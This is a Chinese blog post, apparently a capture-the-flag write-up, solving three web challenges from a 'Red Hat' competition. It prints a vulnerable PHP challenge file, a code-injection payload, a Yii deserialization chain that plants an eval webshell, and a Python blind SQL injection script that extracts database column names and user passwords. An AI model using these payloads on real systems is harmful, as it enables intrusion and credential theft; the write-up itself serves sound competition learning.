@@ -1,0 +1,199 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>红帽三个web - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="find it源码泄露，访问robots.txt,根据提示找到源码
+12345678910111213141516171819202122232425262728293031323334353637,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">红帽三个web</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">红帽三个web</h1>
+        <div class="stuff">
+            <span>五月 09, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHP/" rel="tag">PHP</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="find-it"><a href="#find-it" class="headerlink" title="find it"></a>find it</h1><p>源码泄露，访问robots.txt,根据提示找到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $link = mysql_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;Hello worldd!&lt;/title&gt;</span><br><span class="line">	&lt;style&gt;</span><br><span class="line">	body &#123;</span><br><span class="line">		background-color: white;</span><br><span class="line">		text-align: center;</span><br><span class="line">		padding: <span class="number">50</span>px;</span><br><span class="line">		font-family: <span class="string">&quot;Open Sans&quot;</span>,<span class="string">&quot;Helvetica Neue&quot;</span>,Helvetica,Arial,sans-serif;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">#logo &#123;</span></span><br><span class="line">		margin-bottom: <span class="number">40</span>px;</span><br><span class="line">	&#125;</span><br><span class="line">	&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;img id=<span class="string">&quot;logo&quot;</span> src=<span class="string">&quot;logo.png&quot;</span> /&gt;</span><br><span class="line">	&lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello My freind!&quot;</span>; <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line">	<span class="meta">&lt;?php</span> <span class="keyword">if</span>($link) &#123; <span class="meta">?&gt;</span></span><br><span class="line">		&lt;h2&gt;I Can<span class="string">&#x27;t view my php files?!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">	&lt;?php &#125; else &#123; ?&gt;</span></span><br><span class="line"><span class="string">		&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">	&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">#Really easy...</span></span><br><span class="line"><span class="string">$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);</span></span><br><span class="line"><span class="string">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);</span></span><br><span class="line"><span class="string">$a=$_GET[&#x27;</span>code<span class="string">&#x27;];</span></span><br><span class="line">if(preg_match(&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;,$a))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;you die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($a)&gt;<span class="number">33</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fwrite($hack,$a);</span><br><span class="line">fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);</span><br><span class="line">fclose($file);</span><br><span class="line">fclose($hack);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>会将输入的东西写入hack.php</p>
+<p>审计源码可以发现写入内容会被写入到hack.php直接写入?&gt;&lt;?php phpinfo(); //访问hack.php，搜索flag即可</p>
+<p><img src="%E7%BA%A2%E5%B8%BD%E4%B8%89%E4%B8%AAweb/QQ%E5%9B%BE%E7%89%8720210509184121.png" alt="QQ图片20210509184121"></p>
+<p>不知道是不是非预期，flag直接在环境里面了 = =</p>
+<h1 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h1><p>简单反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;file_put_contents(\&#x27;1.php\&#x27;,&quot;&lt;?php eval(\$_POST[0]);&quot;)&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $keys = [];</span><br><span class="line">        <span class="keyword">private</span> $path;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;axin&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;is&quot;</span>=&gt;<span class="string">&quot;handsome&quot;</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成poc</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>写入之后执行phpinfo发现ban掉很多函数，利用蚁剑的disable_function 直接绕过即可得到flag</p>
+<h1 id="websitemanager"><a href="#websitemanager" class="headerlink" title="websitemanager"></a>websitemanager</h1><p>在image.php 下面直接注入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string, sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze56uon9iidhta1za8c.cloudeci1.ichunqiu.com/image.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="comment"># for j in stringlist:</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>, <span class="number">126</span>):</span><br><span class="line">        <span class="comment"># sql = &quot;1=(ord(substr(database(),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;.format(i,j)</span></span><br><span class="line">        <span class="comment"># sql = &quot;1=(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;.format(i,j)</span></span><br><span class="line">        sql = <span class="string">&quot;1=(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            i, j)</span><br><span class="line">        sql = <span class="string">&quot;1=(ord(substr((select(group_concat(password))from(users)),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: sql&#125;</span><br><span class="line">        res = requests.get(url=url, params=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(res.text) &gt; <span class="number">20000</span>:</span><br><span class="line">            print(j)</span><br><span class="line">            flag += <span class="built_in">chr</span>(j<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">125</span>:</span><br><span class="line">            sys.exit()</span><br></pre></td></tr></table></figure>
+
+<p>弱智的ssrf</p>
+<p><img src="%E7%BA%A2%E5%B8%BD%E4%B8%89%E4%B8%AAweb/image-20210509184512861.png" alt="image-20210509184512861"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#find-it"><span class="toc-number">1.</span> <span class="toc-text">find it</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#framework"><span class="toc-number">2.</span> <span class="toc-text">framework</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#websitemanager"><span class="toc-number">3.</span> <span class="toc-text">websitemanager</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
